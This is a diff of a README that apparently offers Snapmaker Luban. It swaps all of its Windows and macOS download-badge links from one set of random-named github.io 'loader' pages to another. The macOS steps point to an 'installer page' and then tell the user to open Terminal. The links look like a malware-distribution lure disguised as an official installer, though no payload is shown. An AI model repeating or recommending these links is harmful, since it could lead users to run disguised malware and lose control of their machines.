@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Install_Snapmaker%20Luban-F9A825?style=for-the-badge&logo=github)](https://lpysehglnrlc.github.io/win-loader/)
+[![Download](https://img.shields.io/badge/⬇_Install_Snapmaker%20Luban-F9A825?style=for-the-badge&logo=github)](https://mefvwsuclquj.github.io/setup-win/)
 
 </div>
 
@@ -55,9 +55,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://lpysehglnrlc.github.io/win-loader/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mefvwsuclquj.github.io/setup-win/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://lpysehglnrlc.github.io/mac-loader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mefvwsuclquj.github.io/install-mac/)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Install Now](https://img.shields.io/badge/⬇_Install_Snapmaker%20Luban-F9A825?style=for-the-badge&logo=github)](https://lpysehglnrlc.github.io/win-loader/)
+[![Install Now](https://img.shields.io/badge/⬇_Install_Snapmaker%20Luban-F9A825?style=for-the-badge&logo=github)](https://mefvwsuclquj.github.io/setup-win/)
 
 </div>
 
@@ -100,7 +100,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://lpysehglnrlc.github.io/mac-loader/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mefvwsuclquj.github.io/install-mac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
